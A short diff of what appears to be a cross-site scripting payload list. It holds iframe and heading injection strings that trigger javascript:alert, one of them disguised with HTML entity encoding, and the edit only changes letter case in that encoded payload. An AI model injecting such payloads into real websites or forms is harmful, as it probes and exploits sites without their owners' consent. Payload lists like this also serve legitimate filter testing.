@@ -15,7 +15,7 @@ i
 <iframe src="javascript:alert('XsS by \nxss');"></iframe><marquee><h1>XsS by xss</h1></marquee>
 
 "><h1><IFRAME SRC="javascript:alert('xss');"></IFRAME>">123</h1>
-<iframe src=javascript&colon;alert&lpar;document&period;location&period;href&rpar;>
+<iframe src=javascript&colon;alert&lpar;document&period;Location&period;Href&rpar;>
 
 https://google.com/
 https://fb.com
